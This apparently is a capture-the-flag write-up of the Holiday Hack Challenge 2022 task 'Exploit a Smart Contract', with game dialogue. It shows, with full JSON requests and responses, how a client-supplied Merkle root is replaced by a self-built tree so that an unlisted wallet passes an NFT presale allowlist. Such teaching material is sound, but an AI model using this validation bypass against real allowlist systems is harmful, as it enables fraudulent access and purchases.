
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
    
    
      
        <title>3. Exploit a Smart Contract - Holiday Hack Challenge 2022</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.975780f9.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="None" data-md-color-accent="None">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#chat-with-luigi" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Holiday Hack Challenge 2022" class="md-header__button md-logo" aria-label="Holiday Hack Challenge 2022" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Holiday Hack Challenge 2022
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              3. Exploit a Smart Contract
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Holiday Hack Challenge 2022" class="md-nav__button md-logo" aria-label="Holiday Hack Challenge 2022" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Holiday Hack Challenge 2022
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        KringleCon 2022
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../0.%20KringleCon%20Orientation/" class="md-nav__link">
        0. KringleCon Orientation
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../6.%20Finale/" class="md-nav__link">
        6. Finale
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          1. Recover the Tolkien Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="1. Recover the Tolkien Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          1. Recover the Tolkien Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/" class="md-nav__link">
        1. Wireshark Practise
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/" class="md-nav__link">
        2. Windows Event Logs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/" class="md-nav__link">
        3. Suricata Regatta
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          2. Recover the Elfen Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="2. Recover the Elfen Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          2. Recover the Elfen Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/" class="md-nav__link">
        1. Clone with a Difference
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/" class="md-nav__link">
        2. Prison Escape
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/" class="md-nav__link">
        3. Jolly CI CD
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          3. Recover the Web Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="3. Recover the Web Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          3. Recover the Web Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/" class="md-nav__link">
        2. Open Boria Mine Door
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/" class="md-nav__link">
        3. Glamtariel's Fountain
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_3" type="checkbox" id="__nav_6_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_3">
          1. Boria PCAP Mining
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="1. Boria PCAP Mining" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_3">
          <span class="md-nav__icon md-icon"></span>
          1. Boria PCAP Mining
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/" class="md-nav__link">
        1. Naughty IP
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/" class="md-nav__link">
        2. Credential Mining
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/" class="md-nav__link">
        3. 404 FTW
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/" class="md-nav__link">
        4. IMDS, XXE, and Other Abbreviations
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          4. Recover the Cloud Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="4. Recover the Cloud Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          4. Recover the Cloud Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/" class="md-nav__link">
        1. AWS CLI Intro
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/" class="md-nav__link">
        2. Trufflehog Search
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/" class="md-nav__link">
        3. Exploitation via AWS CLI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          5. Recover the Burning Ring of Fire
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="5. Recover the Burning Ring of Fire" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          5. Recover the Burning Ring of Fire
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../1.%20Buy%20a%20Hat/" class="md-nav__link">
        1. Buy a Hat
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2.%20Blockchain%20Divination/" class="md-nav__link">
        2. Blockchain Divination
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          3. Exploit a Smart Contract
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        3. Exploit a Smart Contract
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#chat-with-luigi" class="md-nav__link">
    Chat with Luigi
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminal" class="md-nav__link">
    Terminal
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rejoice" class="md-nav__link">
    Rejoice
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#chat-with-grinchum" class="md-nav__link">
    Chat with Grinchum
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#chat-with-luigi" class="md-nav__link">
    Chat with Luigi
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminal" class="md-nav__link">
    Terminal
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rejoice" class="md-nav__link">
    Rejoice
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#chat-with-grinchum" class="md-nav__link">
    Chat with Grinchum
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>3. Exploit a Smart Contract</h1>

<p>Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.</p>
<p>Difficulty: 5/5</p>
<h2 id="chat-with-luigi">Chat with Luigi</h2>
<p>Psst. Hey, slick - over here. Myeah.</p>
<p>You look like a sucker ahem I mean, savvy.</p>
<p>I got some exclusive, very rare, very valuable NFTs for sale.</p>
<p>But I run a KringleCoin-only business. Kapeesh?</p>
<p>Ever buy somethin' with cryptocurrency before?</p>
<p>Didn't think so, but if you wheel and deal with ya' pal Luigi here, now you can!</p>
<p>But we're currently in pre-sale, and you gotta be on the list. Myeah, see?</p>
<p>BSRS NFTs are a swell investment. They'll be worth a pretty penny, and that's a promise.</p>
<p>So when they're purchasable, you better snatch 'em up before the other boneheads ahem I mean, eggheads do.</p>
<p>I got a business to run. You can't buy nothin' right now, so scram. Kapeesh?</p>
<h2 id="terminal">Terminal</h2>
<pre><code>Welcome to the Bored Sporc Rowboat Society Presale Page!

The presale is only available to those select individuals who have earned a place on our exclusive presale list. If you're not on the list, you might as well leave, because you ain't gettin' a Sporc until we open up sales to the general public. If you are on the list, welcome!

    Here's all you gotta do to pre-purchase your Sporc:
    The presale price for a Sporc is 100 KringleCoin (KC). Yeah, we know that's crazy cheap, but we take care of our buds. When we open sales to the public, these things are gonna shoot to the moon.
    First, you're gonna want to make sure that your wallet address is on the approved list. Just make sure to leave the &quot;Validate only&quot; box checked, fill in the form, and we'll let you know if you're good-to-go. Before you do anything else, it's always good to be sure you're doing everything right and your address is validated as being on the list (it's actually something called a Merkle Tree... very high-techy-techy stuff).
    To check if you're on the list, enter your wallet address and the string of proof values that we gave you when we told you that you were on the pre-approved list. Those values should be hex strings (i.e. start with &quot;0x&quot; and consist of a bunch of values that are 0-9 or &quot;a,&quot; &quot;b,&quot; &quot;c,&quot; &quot;d,&quot; &quot;e,&quot; or &quot;f&quot;). If you're confused, give us a shout and we can help.
    If you're not on the presale list, you're not on the list. Don't beg and plead with us to put you on the list. Seriously - we've only put Sporcs that we're tight with on the list. WE decided who's on the list (COOL SPORCS ONLY). We don't just let anyone on. If we were putting you on the list, we would've contacted you... not the other way around.
    Once you've confirmed everything works and you're sure you have the whole validated-and-on-the-list thing down, just go find a KTM and pre-approve a 100 KC transaction from the wallet you validated. That way, the funds are ready to go. Our Wallet Address is 0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a.
    Once you've pre-approved the payment, come back here do the same thing you did when you validated your address, just uncheck the &quot;Validate Only&quot; thing. Then, we'll grab your K'Coin, mint a brand spankin' new Sporc, and fire it into your wallet. Zap! Just like that, you'll be the owner of an amazing piece of the digital domain and a member of the Bored Sporc Rowboat Society for life! (Or, until you decide to cash-out and sell your Bored Sporc).
</code></pre>
<p>Hint 1:</p>
<blockquote>
<p>You're going to need a <a href="https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/">Merkle Tree</a> of your own. Math is hard. <a href="https://youtu.be/Qt_RWBq63S8">Professor Petabyte</a> can help you out.</p>
</blockquote>
<p>Hint 2:</p>
<blockquote>
<p>You can change something that you shouldn't be allowed to change. This <a href="https://github.com/QPetabyte/Merkle_Trees">repo</a> might help!</p>
</blockquote>
<p>After reading through the resources mentioned in Hint 1, we understand the working of Merkle trees and that they can be used to verify presence of an element in a set. </p>
<p>We infer that the pre sale list uses a merkle tree to store the allowed wallet addresses. In order to validate the presence our wallet address in the list, we are required to provide our wallet address and the proof.</p>
<p><img alt="" src="../../images/burning_ring/verify.png" /></p>
<p>Ideally at the backend these inputs would be used to compute the root and if this computed root matches the actual root value the verification would pass.
However there is a vulnerability in the validation logic.</p>
<p>In the request sent to the server there is a root parameter and it appears that the computed root is compared with this root parameter.
Request</p>
<pre><code>{
    &quot;Proof&quot;: &quot;0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a&quot;,
    &quot;Root&quot;: &quot;0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1&quot;,
    &quot;Session&quot;: &quot;48965082-df9b-4bf8-8669-a93746a87f0a&quot;,
    &quot;Validate&quot;: &quot;true&quot;,
    &quot;WalletID&quot;: &quot;0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3&quot;
}
</code></pre>
<p>Response</p>
<pre><code>{
    &quot;Response&quot;: &quot;That address isn't on the list/Merkel Tree. If you're legit, you may need to try another of your addresses.&lt;br&gt;If you're trying to scam your way into the pre-sale, get lost loser!&quot;
}
</code></pre>
<p>As this parameter value can be changed to any value we like we can force the validation to succeed by "planting our own merkle tree". We can create our own merkle tree containing our wallet address and pass the corresponding root and proof values. </p>
<p>The second hint points us to a repo which can be used to create merkle trees. Let's clone the repo. We see the following line which defines the values to be included in the Merkle tree.</p>
<p><code>allowlist = ['0x1337133713371337133713371337133713371337','0x0000000000000000000000000000000000000000']</code></p>
<p>Let's add our wallet address to the list and run the script.</p>
<pre><code>mt_user@cf57d0813b27:~$ python3 merkle_tree.py
Root: 0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed
Proof: ['0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a']
</code></pre>
<p>Let's send a modified request containing our newly generated Merkle tree. The validation succeeds.</p>
<p>Request</p>
<pre><code>{
    &quot;Proof&quot;: &quot;0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a&quot;,
    &quot;Root&quot;: &quot;0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed&quot;,
    &quot;Session&quot;: &quot;48965082-df9b-4bf8-8669-a93746a87f0a&quot;,
    &quot;Validate&quot;: &quot;true&quot;,
    &quot;WalletID&quot;: &quot;0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3&quot;
}
</code></pre>
<p>Response</p>
<pre><code>{
    &quot;Response&quot;: &quot;You're on the list and good to go! Now... BUY A SPORC!&quot;
}
</code></pre>
<p>Now let's switch the <code>validate</code> parameter to <code>false</code> to purchase the NFT.
Request</p>
<pre><code>{
    &quot;Proof&quot;: &quot;0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a&quot;,
    &quot;Root&quot;: &quot;0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed&quot;,
    &quot;Session&quot;: &quot;48965082-df9b-4bf8-8669-a93746a87f0a&quot;,
    &quot;Validate&quot;: &quot;false&quot;,
    &quot;WalletID&quot;: &quot;0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3&quot;
}
</code></pre>
<p>Response</p>
<pre><code>{
    &quot;Response&quot;: &quot;Did you approve a 100 KC transaction for our wallet? The transaction failed with \&quot;Insufficient Allowance\&quot;.&quot;
}
</code></pre>
<p>Let's issue the request again after approving the 100 KC transaction from a KTM.</p>
<p>Request</p>
<pre><code>{
    &quot;Proof&quot;: &quot;0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a&quot;,
    &quot;Root&quot;: &quot;0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed&quot;,
    &quot;Session&quot;: &quot;48965082-df9b-4bf8-8669-a93746a87f0a&quot;,
    &quot;Validate&quot;: &quot;false&quot;,
    &quot;WalletID&quot;: &quot;0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3&quot;
}
</code></pre>
<p>Response</p>
<pre><code>{
    &quot;Response&quot;: &quot;Success! You are now the proud owner of BSRS Token #000304. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS304, or check it out in the gallery!&lt;br&gt;Transaction: 0x10948c5bd5759cdceb9e448c4da4ceac938015edef1ae0043b1939d53b4dd23d, Block: 81363&lt;br&gt;&lt;br&gt;Remember: Just like we planned, tell everyone you know to &lt;u&gt;&lt;em&gt;BUY A BoredSporc&lt;/em&gt;&lt;/u&gt;.&lt;br&gt;When general sales start, and the humans start buying them up, the prices will skyrocket, and we all sell at once!&lt;br&gt;&lt;br&gt;The market will tank, but we'll all be rich!!!&quot;
}
</code></pre>
<p><img alt="BSRS304" src="/HHC2022/docs//images/BSRS304.png" /></p>
<h2 id="rejoice">Rejoice</h2>
<p>What!? How'd you get on the list? What's that? You's a double agent, and you're actually workin' for us?</p>
<p>I don't know if I buy that, but you're on the list, so... myeah.</p>
<p>Somethin' about this ain't sittin' right with me, but there's no reversing transactions with cryptocurrency.</p>
<p>That NFT is yours to keep, but if I find out you're lyin' to me, Palzari's gonna pay you a visit. Kapeesh?</p>
<h2 id="chat-with-grinchum">Chat with Grinchum</h2>
<p>üò† We wants them... we needs them... Must.. have.. the Preciouses.</p>
<p>They stole them from us, sneaky little humanses.</p>
<p>üôÇ No, not the humanses, they're my friends.</p>
<p>üòè You don't have any friends. NOBODY likes YOU. You're a liar, and a thief, and a.... grriiiiiiinch.</p>
<p>üò¢ Go away... we don't need you anymore. The humanses protect us now.</p>
<p>üò† Go away? I protected us. The preciouses are safe because of ME!</p>
<p>üôÇ Leave now, and never.. come back. üòÉ Leave now, and never.. come back!</p>
<p>üòÅLEAVE NOW, AND NEVER.. COME BACK!üò¨</p>
<p>Friendly human, please go to jolly human's castle! Go on, we will meet you there!</p>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="Footer" >
      
        
        <a href="../2.%20Blockchain%20Divination/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 2. Blockchain Divination" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              2. Blockchain Divination
            </div>
          </div>
        </a>
      
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.5a2dcb6a.min.js"></script>
      
    
    
  </body>
</html>